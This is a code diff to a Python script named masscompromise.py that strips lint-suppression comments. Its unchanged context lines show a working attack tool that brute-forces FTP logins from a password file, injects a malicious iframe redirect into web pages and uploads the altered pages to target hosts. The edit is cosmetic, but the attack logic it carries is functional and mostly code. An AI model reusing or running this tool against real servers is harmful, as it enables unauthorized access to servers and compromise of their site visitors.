@@ -36,10 +36,10 @@ def bruteLogin(ip, passwdFile):
         try:
             ftp = ftplib.FTP(ip)
             ftp.login(userName, passWord)
-            print('\n[*] ' + str(ip) + ' FTP Logon Succeeded: ' + userName + '/' + passWord)  # noqa: E501
+            print('\n[*] ' + str(ip) + ' FTP Logon Succeeded: ' + userName + '/' + passWord)
             ftp.quit()
             return (userName, passWord)
-        except Exception as e:  # noqa: F841
+        except Exception as e:
             pass
     print('\n[-] Could not brute force FTP credentials.')
     return (None, None)
@@ -73,7 +73,7 @@ def injectPage(ftp, page, redirect):
     f.write(redirect)
     f.close()
     print('[+] Injected Malicious IFrame on: ' + page)
-    ftp.storlines('STOR ' + page, open(page + '.tmp',  # pylint: disable=R1732  # noqa: E501
+    ftp.storlines('STOR ' + page, open(page + '.tmp',  # pylint: disable=R1732
                                        'r',
                                        encoding='utf-8-sig'))
     print('[+] Uploaded Injected Page: ' + page)
@@ -90,7 +90,7 @@ def attack(username, password, tgtHost, redirect):
 
 def main():
     ''' main function'''
-    parser = argparse.ArgumentParser(usage='masscompromise.py -H <target host[s]> -r <redirect page> [-f <userpass file>]')  # noqa: E501
+    parser = argparse.ArgumentParser(usage='masscompromise.py -H <target host[s]> -r <redirect page> [-f <userpass file>]')
     parser.add_option('-H', type='string', help='specify target host')
     parser.add_option('-f', type='string', help='specify user/password file')
     parser.add_option('-r', type='string', help='specify a redirection page')
@@ -112,7 +112,7 @@ def main():
         elif passwdFile is not None:
             (username, password) = bruteLogin(tgtHost, passwdFile)
         if password is not None:
-            print('[+] Using Creds: ' + username + '/' + password + ' to attack')  # noqa: E501
+            print('[+] Using Creds: ' + username + '/' + password + ' to attack')
             attack(username, password, tgtHost, redirect)
 
 
